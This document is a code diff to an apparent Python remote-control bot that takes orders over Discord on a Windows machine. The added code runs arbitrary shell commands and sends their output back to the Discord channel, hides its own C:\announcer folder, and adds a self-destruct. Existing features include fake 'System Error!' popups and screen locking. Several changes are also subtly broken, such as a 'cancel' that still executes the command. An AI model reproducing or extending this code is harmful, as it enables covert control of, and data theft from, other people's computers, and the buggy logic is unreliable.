@@ -37,7 +37,7 @@ print(f"Token value: {token}")
 
 timeout = 1
 connection = False
-def wifi_check():
+async def wifi_check():
     try:
         requests.head("https://discord.com", timeout=timeout)
         # Connection Success
@@ -48,11 +48,17 @@ def wifi_check():
         print("The internet connection is down")
         connection = False
         time.sleep(1)
-        wifi_check()
+        await wifi_check()
 
-wifi_check()
+asyncio.run(wifi_check())
 
 class MyClient(discord.Client):
+    async def on_disconnect(self):
+        print("Bot disconnected from Discord (possible internet loss).")
+
+    async def on_resumed(self):
+        print("Bot reconnected to Discord.")
+
     async def on_ready(self):
         #announce logon
         print(f'Logged on as {self.user}!') ,
@@ -197,18 +203,21 @@ class MyClient(discord.Client):
                 def check(m):
                     return m.author == message.author and m.channel == message.channel
                 msg = await client.wait_for('message', check=check)
-
-                def Dialog_Box():
-                    message_content = (msg.content)
-                    root = tk.Tk()
-                    root.withdraw()  # Hide the root window
-                    root.attributes('-topmost', True)  # Always on top
-                    messagebox.showinfo("System Error!", message_content)
-                    root.destroy()
-                #open dialog box
-                t2 = Thread(target=Dialog_Box)
-                t2.start()
-                t2.join()
+                if msg.content == 'cancel':
+                    await message.channel.send('Message sending cancelled')
+                    return
+                else:
+                    def Dialog_Box():
+                        message_content = (msg.content)
+                        root = tk.Tk()
+                        root.withdraw()  # Hide the root window
+                        root.attributes('-topmost', True)  # Always on top
+                        messagebox.showinfo("System Error!", message_content)
+                        root.destroy()
+                        #open dialog box
+                        t2 = Thread(target=Dialog_Box)
+                        t2.start()
+                        t2.join()
             #lock the screen
             if f'{message.content}' == 'lock': 
                 # Lock the screen
@@ -336,14 +345,17 @@ class MyClient(discord.Client):
                     return m.author == message.author and m.channel == message.channel
                 msg = await client.wait_for('message', check=check)
                 volume = float(msg.content) / 100.0  # Convert to a value between 0.0 and 1.0
-
-                devices = AudioUtilities.GetSpeakers()
-                interface = devices.Activate(
-                    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-                volume_interface = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
-                volume_interface.SetMasterVolumeLevelScalar(volume, None)
-
-                await message.channel.send(f'Volume set to {msg.content}%')
+                if msg.content == 'cancel':
+                    await message.channel.send('Volume change cancelled')
+                    return
+                else:
+                    devices = AudioUtilities.GetSpeakers()
+                    interface = devices.Activate(
+                        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+                    volume_interface = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
+                    volume_interface.SetMasterVolumeLevelScalar(volume, None)
+                    await message.channel.send(f'Volume set to {msg.content}%')
+                    return
             #display a user defined message
             if f'{message.content}' == 'help':
                 help_message = (
@@ -361,6 +373,12 @@ class MyClient(discord.Client):
                     "sound - Play a sound\n"
                     "vol - Set the volume\n"
                     "min - Minimize all windows\n"
+                    "scrvid - Record a video of the screen\n"
+                    "cmd - Run a command\n"
+                    "selfdestruct - Self-destruct the application\n"
+                    "hide - Hide the announcer folder\n"
+                    "unhide - Unhide the announcer folder\n"
+                    "help - Show this help message\n"
                 )
                 await message.channel.send(help_message)
             #press win + d
@@ -398,12 +416,37 @@ class MyClient(discord.Client):
                 def check(m):
                     return m.author == message.author and m.channel == message.channel
                 msg = await client.wait_for('message', check=check)
-                os.system(msg.content)
+                if not msg.content == 'cancel':
+                    os.system(msg.content)
+                else:
+                    await message.channel.send('Command cancelled')
                 await message.channel.send(f'Command "{msg.content}" executed')
+                #output command prompt output if there is one
+                output = os.popen(msg.content).read()
+                if output:
+                    await message.channel.send(f'Command output:\n{output}')
         except Exception as e:
             await message.channel.send(f'An error occurred: {str(e)}')
+            
+        if f'{message.content}' == 'selfdestruct':
+            os.system('taskkill /f /im index.exe')
+            await message.channel.send('Self-destruct sequence initiated')
+            await message.channel.send('goodbye...')
+            #download delete script and place it into appdata
+            await client.close()
+        
+        if f'{message.content}' == 'hide':
+            # Make the announcer folder hidden
+            os.system('attrib +h C:\\announcer')
+            await message.channel.send('Folder hidden')
+        if f'{message.content}' == 'unhide':
+            # Make the announcer folder visible
+            os.system('attrib -h C:\\announcer')
+            await message.channel.send('Folder unhidden')
 
 
+        
+        
 
 intents = discord.Intents.default()
 intents.message_content = True
